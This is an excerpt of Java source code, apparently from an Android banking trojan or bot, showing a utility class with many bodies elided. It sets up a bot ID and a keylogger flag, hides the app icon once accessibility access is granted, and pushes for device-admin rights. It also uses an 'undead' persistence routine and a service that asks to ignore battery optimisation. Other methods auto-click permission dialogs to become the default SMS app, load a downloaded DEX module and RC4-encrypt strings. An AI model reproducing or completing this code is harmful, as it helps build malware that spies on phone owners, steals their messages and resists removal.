...
public class utils {
    ...
    public void initialization(Context context){ // initialization
        try {
            if (isAccessibilityServiceEnabled(context, Access.class)) {
                deleteLabelIcon(context);
            }
            SettingsWrite(context, consts.idbot, randomString(4));//idutl.IDBot(context)); //randomString(22));////
            ...
            SettingsWrite(context, "tag", consts.tag);
            ...
            SettingsWrite(context, consts.keylogger, consts.str_1);
            ...
            SettingsWrite(context, consts.start_admin, consts.str_1);
            SettingsWrite(context, consts.undead, "0");
            SettingsWrite(context, "protecttry", consts.str_null);
            SettingsWrite(context, "firststart", consts.str_1);
            ...
            SettingsWrite(context, "unlock_pass_found", "true");
            SettingsWrite(context, "paranoid", "0");
            SettingsWrite(context, consts.endlessServiceStatus, "");
            SettingsWrite(context, consts.userPresent, "0");
            SettingsWrite(context, consts.timesAdminPerm, "0");
            SettingsWrite(context, consts.timeSinceKnock, new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date()));

            SettingsWrite(context, "websocket", "0");

            SettingsWrite(context, "miuiperm", "0");
            SettingsWrite(context, "installapk", "0");

            if (android.os.Build.VERSION.SDK_INT >= 19) {
                SettingsWrite(context, consts.packageNameDefultSmsMenager, Telephony.Sms.getDefaultSmsPackage(context));
            } else {
    ...
    public void deleteLabelIcon(Context context){
    ...
    public boolean hasPermission(Context context, String perms){
        return context.checkCallingOrSelfPermission(perms) == PackageManager.PERMISSION_GRANTED;
    }
    ...
    public boolean checkWritePerm(Context cnt) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            return Environment.isExternalStorageManager();
        } else {
            int result = ContextCompat.checkSelfPermission(cnt, READ_EXTERNAL_STORAGE);
            int result1 = ContextCompat.checkSelfPermission(cnt, WRITE_EXTERNAL_STORAGE);
            return result == PackageManager.PERMISSION_GRANTED && result1 == PackageManager.PERMISSION_GRANTED;
        }
    }
    public String getServiceLabel(Context context, Class<?> serviceClass) {
    ...
    public String sendMainModuleDEX(Context context, String params){
        try {
            if(new File(context.getDir(consts.string_95, Context.MODE_PRIVATE), consts.nameModule).exists()) {
                ...
                Class classToLoad = classloader.loadClass(consts.string_107);
            ...
            Log(consts.string_109,consts.string_110 + e);
           // SettingsToAdd(context, consts.LogSMS , consts.string_182 + e.toString() + consts.string_119);
            return "";
        }
    }

    public boolean hasInstallFromUnknownSourcesPermission(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            return context.getPackageManager().canRequestPackageInstalls();
        } else {
            int unknownSourcesPermission = context.checkCallingOrSelfPermission("android.permission.REQUEST_INSTALL_PACKAGES");
            return unknownSourcesPermission == PackageManager.PERMISSION_GRANTED;
        }
    }
    ...
    public void RemoteLog(Context context, String text){
        SettingsToAdd(context, consts.LogSMS , text + consts.string_119);
    }
    ...
    public void runService(Context context, Class<?> serviceClass, String action) {
        try {
            if (!isMyServiceRunning(context, serviceClass)) {
                Log.d("runService", serviceClass.getName());
    ...
    public boolean startKingService(Context context) {
        try {
            if (!isMyServiceRunning(context, kingservice.class)) {
                context.startService(new Intent(context, kingservice.class));
                return true;
            }
        } catch (Exception ex) {
            ex.printStackTrace();
            if (!idutl.is_dozemode(context) && isAccessibilityServiceEnabled(context.getApplicationContext(), Access.class)) {
                try {
                    Intent intent1 = new
                            Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            Uri.parse(consts.strPackage + context.getPackageName()));
                    ...
                    Log.d("KingServiceStarter", exc.toString());
                }
            }
    ...
    public void runForegroundService(Context context, Class<?> serviceClass, String action) {
        try {
            if (!isMyServiceRunning(context, serviceClass)) {
                Log.d("runService", serviceClass.getName());
                Intent intent = new Intent(context, serviceClass);
    ...
    public boolean autoclick_change_smsManager_sdk_Q(AccessibilityService service, AccessibilityEvent event, String className, String packName) {
        try {
            if (android.os.Build.VERSION.SDK_INT >= 18) {
                if (packName.contains("com.google.android.permissioncontroller") || packName.contains("com.android.permissioncontroller")) {
    ...
    public void swapSmsMenager(Context context, String packageName){
        try{
            ...
            Log.d("SmsSwap","Error: " +e.toString());
        }
    ...
    public void undead(final Context context){
    ...
    public void SettingsToAddJson(Context context, String name, String params){
        try{
            ...
            Log(consts.string_134,consts.string_135 + ": " + ex.toString());
            SettingsWrite(context, name,  params);
        }
    }
    ...
    public String strEncRC4(String text, String key){
        ...
        String b64String =  Base64.encodeToString(result, Base64.DEFAULT);
